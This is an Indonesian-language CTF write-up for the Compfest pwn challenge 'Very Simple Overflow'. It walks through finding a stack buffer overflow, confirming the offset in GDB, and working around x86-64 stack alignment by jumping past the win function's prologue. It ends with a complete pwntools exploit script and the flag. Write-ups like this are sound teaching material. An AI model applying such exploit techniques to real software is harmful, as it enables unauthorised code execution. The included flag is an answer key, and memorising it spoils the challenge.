# **Write-up CTF Compfest: Very Simple Overflow**

## **Informasi Tantangan**

  * **Nama:** Very Simple Overflow
  * **Kategori:** Pwn / Binary Exploitation
  * **Deskripsi:** Diberikan sebuah file binary dan alamat server. Tujuannya adalah mengeksploitasi kerentanan untuk mendapatkan flag.

## **Ringkasan (TL;DR)**

Tantangan ini memiliki kerentanan *stack buffer overflow* yang sangat jelas. Tujuannya adalah melakukan `ret2win` dengan melompat ke fungsi `win` yang tersembunyi. Namun, tantangan sebenarnya terletak pada masalah **stack alignment** pada arsitektur 64-bit yang menyebabkan *crash* saat dipanggil secara naif. Karena keterbatasan ukuran input, solusi standar (menggunakan `ret gadget`) tidak dapat diterapkan. Solusi akhirnya adalah dengan melompat satu byte setelah awal fungsi `win` untuk melewati instruksi `push rbp`, sehingga menjaga stack tetap *aligned* dan memungkinkan eksekusi fungsi `win` berhasil.

-----

### **1. Analisis Awal & Reconnaissance**

Langkah pertama adalah melakukan analisis dasar pada file `chall` yang diberikan.

  * `file chall`: Menunjukkan bahwa ini adalah file ELF 64-bit, dynamically linked, dan tidak di-strip (masih memiliki simbol).
  * `checksec chall`:
      * **No Canary found**: Proteksi *stack canary* non-aktif. Ini membuka pintu untuk eksploitasi stack overflow.
      * **No PIE (0x400000)**: *Position-Independent Executable* non-aktif. Alamat-alamat fungsi dan data di dalam binary akan tetap sama setiap kali dieksekusi, menyederhanakan eksploitasi.
  * `strings chall`: Menemukan beberapa string menarik, termasuk "You know the drill" dan yang paling penting, sebuah fungsi bernama `win`. Ini adalah petunjuk besar adanya fungsi kemenangan yang bisa kita panggil.

Selanjutnya, binary dianalisis menggunakan Ghidra untuk dekompilasi.

```c
// Fungsi rentan
void vuln(void) {
    char buffer[16];
    printf("You know the drill\n>> ");
    fflush(stdout);
    // Kerentanan: Membaca 32 byte ke buffer 16 byte
    read(0, buffer, 32); 
}

// Fungsi kemenangan
void win(void) {
    // Fungsi ini membuka flag.txt dan mencetaknya
    char flag_buffer[100];
    FILE *file = fopen("flag.txt", "r");
    if (file) {
        fread(flag_buffer, 1, sizeof(flag_buffer), file);
        printf("%s\n", flag_buffer);
        fclose(file);
    }
}
```

Dari sini, rencana eksploitasi tampak jelas: temukan offset untuk menimpa *return address* dan arahkan ke fungsi `win`.

### **2. Perjalanan Menemukan Offset yang Benar**

Ini adalah bagian paling rumit dari tantangan ini, yang penuh dengan informasi yang menyesatkan.

  * **Analisis Statis (Gagal)**: Ghidra menunjukkan dua informasi yang saling bertentangan. Ringkasan decompiler menyebutkan buffer berada di `Stack[-0x18]`, yang mengarah pada perhitungan `OFFSET = 32`. Namun, instruksi Assembly yang sebenarnya adalah `LEA RAX, [RBP - 0x10]`, yang mengarah pada perhitungan `OFFSET = 24`.
  * **Analisis Dinamis (Berhasil)**: Karena analisis statis tidak meyakinkan, satu-satunya cara adalah dengan analisis dinamis menggunakan GDB.
    1.  Sebuah pola unik (`cyclic(200)`) dikirim ke program yang berjalan di dalam GDB.
    2.  Program crash saat menjalankan instruksi `ret`. `RIP` tidak tertimpa, yang menandakan crash terjadi tepat di instruksi `ret` itu sendiri.
    3.  Dengan memeriksa puncak stack (`x/gx $rsp`), kita menemukan nilai yang akan dieksekusi, yaitu `0x6161616861616167`.
    4.  `cyclic_find(0x6161616861616167)` mengkonfirmasi secara definitif bahwa **offset yang benar adalah 24**.

### **3. Masalah Stack Alignment & Solusi Cerdas**

Dengan `OFFSET = 24`, payload `ret2win` sederhana dibuat: `padding(24) + win_addr(8)`. Ukuran totalnya 32 byte, pas dengan `read(..., 32)`.

Namun, eksploit ini berhasil di lokal tetapi selalu gagal di server remote. Server menutup koneksi tanpa mengirim data (0 byte). Ini adalah gejala klasik dari **masalah stack alignment**.

  * **Penyebab**: Pada arsitektur x86-64, stack harus 16-byte aligned sebelum memanggil fungsi libc. `ret` dari `vuln` membuat stack menjadi aligned (`16n`), tetapi instruksi pertama di fungsi `win` (`push rbp`) kembali membuat stack menjadi tidak aligned (`16n + 8`), menyebabkan `fopen` crash.
  * **Dilema**: Solusi standar untuk ini adalah menyelipkan `ret gadget` (`padding + ret + win`), tetapi ini akan membuat payload menjadi 40 byte, yang melebihi batas `read()` 32 byte.
  * **Solusi Akhir**: Triknya adalah **melompat melewati prolog fungsi `win`**. Daripada melompat ke awal `win` di `0x401186` (yang berisi `push rbp`), kita melompat ke instruksi setelahnya di `0x401187`. Dengan cara ini, `push rbp` tidak pernah dieksekusi, stack tetap *aligned*, dan `fopen` bisa berjalan tanpa crash.

### **4. Skrip Exploit Final**
Berdasarkan semua analisis dan debugging, berikut adalah skrip akhir yang berhasil mendapatkan flag. 

```python
#!/usr/bin/env python3
from pwn import *

# Fungsi helper untuk beralih antara tes lokal dan remote
def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote('ctf.compfest.id', 7004)
    else:
        return process(exe.path)

# --- KONFIGURASI ---
context.binary = exe = ELF('./chall', checksec=False)
context.log_level = 'info'

# --- PAYLOAD ---
OFFSET = 24          # Dikonfirmasi via GDB
WIN_ADDR = 0x401186  # Alamat awal fungsi win

# Trik: Lompat ke alamat setelah instruksi 'push rbp' (1 byte)
EXPLOIT_ADDR = WIN_ADDR + 1

info(f"Offset terkonfirmasi: {OFFSET}")
info(f"Alamat eksekusi (melompati prolog): {hex(EXPLOIT_ADDR)}")

payload = flat([
    b'A' * OFFSET,
    p64(EXPLOIT_ADDR)
])
assert len(payload) == 32

# --- EKSEKUSI ---
p = start()

# Interaksi dengan server
p.recvuntil(b'>> ')
p.send(payload)
log.success("Payload terkirim!")

# Menerima flag
flag_output = p.recvall(timeout=3)
if flag_output:
    log.success(f"Flag ditemukan: {flag_output.decode(errors='ignore').strip()}")
else:
    log.warning("Tidak ada output yang diterima.")

p.close()
```

### **5. Flag**
`COMPFEST17{the_risk_i_took_was_calculated_but_man_am_i_bad_at_math_ed0ea99d31}` 
